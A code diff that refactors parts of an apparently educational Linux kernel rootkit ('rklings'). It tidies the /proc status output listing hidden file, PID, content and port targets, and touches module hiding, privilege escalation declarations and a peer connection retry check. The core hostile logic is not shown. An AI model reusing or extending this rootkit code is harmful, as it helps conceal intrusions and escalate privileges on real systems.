@@ -23,7 +23,6 @@
 #include "target_list.h"
 
 #define RK_BUF_MAX 2048
-#define RK_CMD_MAX 128
 #define RK_PREFIX "rklings."
 #define RK_PREFIX_LEN 8
 #define RK_PATH_MAX 128
@@ -68,10 +67,6 @@ bool module_hidden;
 bool persist_requested;
 
 /* --- module hiding (M01) --- */
-
-void rk_module_hide(void);
-void rk_module_unhide(void);
-int rk_escalate_pid(unsigned int pid);
 
 void rk_module_hide(void)
 {
@@ -483,38 +478,27 @@ static struct kretprobe tcp6_probe = {
 
 /* --- proc interface --- */
 
-static int rk_show(struct seq_file *out, void *unused)
+static void rk_show_list(struct seq_file *out, const char *name,
+			 struct rk_target_list *list)
 {
 	unsigned long flags;
 	unsigned int i;
 
+	seq_printf(out, "%s:\n", name);
+	spin_lock_irqsave(&list->lock, flags);
+	for (i = 0; i < list->count; i++)
+		seq_printf(out, "  [%u] %s\n", i, list->entries[i]);
+	spin_unlock_irqrestore(&list->lock, flags);
+}
+
+static int rk_show(struct seq_file *out, void *unused)
+{
 	seq_printf(out, "module: %s\n", module_hidden ? "yes" : "no");
 	seq_printf(out, "persist: %s\n", persist_requested ? "yes" : "no");
-
-	seq_puts(out, "file_targets:\n");
-	spin_lock_irqsave(&file_targets.lock, flags);
-	for (i = 0; i < file_targets.count; i++)
-		seq_printf(out, "  [%u] %s\n", i, file_targets.entries[i]);
-	spin_unlock_irqrestore(&file_targets.lock, flags);
-
-	seq_puts(out, "pid_targets:\n");
-	spin_lock_irqsave(&pid_targets.lock, flags);
-	for (i = 0; i < pid_targets.count; i++)
-		seq_printf(out, "  [%u] %s\n", i, pid_targets.entries[i]);
-	spin_unlock_irqrestore(&pid_targets.lock, flags);
-
-	seq_puts(out, "content_targets:\n");
-	spin_lock_irqsave(&content_targets.lock, flags);
-	for (i = 0; i < content_targets.count; i++)
-		seq_printf(out, "  [%u] %s\n", i, content_targets.entries[i]);
-	spin_unlock_irqrestore(&content_targets.lock, flags);
-
-	seq_puts(out, "port_targets:\n");
-	spin_lock_irqsave(&port_targets.lock, flags);
-	for (i = 0; i < port_targets.count; i++)
-		seq_printf(out, "  [%u] %s\n", i, port_targets.entries[i]);
-	spin_unlock_irqrestore(&port_targets.lock, flags);
-
+	rk_show_list(out, "file_targets", &file_targets);
+	rk_show_list(out, "pid_targets", &pid_targets);
+	rk_show_list(out, "content_targets", &content_targets);
+	rk_show_list(out, "port_targets", &port_targets);
 	return 0;
 }
 
@@ -566,7 +550,7 @@ static int __init rk_init(void)
 			return -EINVAL;
 	}
 	if (!peer_port || !retry_base_ms ||
-	    retry_base_ms > retry_max_ms || retry_max_ms > 5000)
+	    retry_base_ms > retry_max_ms || retry_max_ms > RK_RETRY_MAX_CAP_MS)
 		return -EINVAL;
 
 	error = rk_parse_hex_key(control_key, key, sizeof(key));
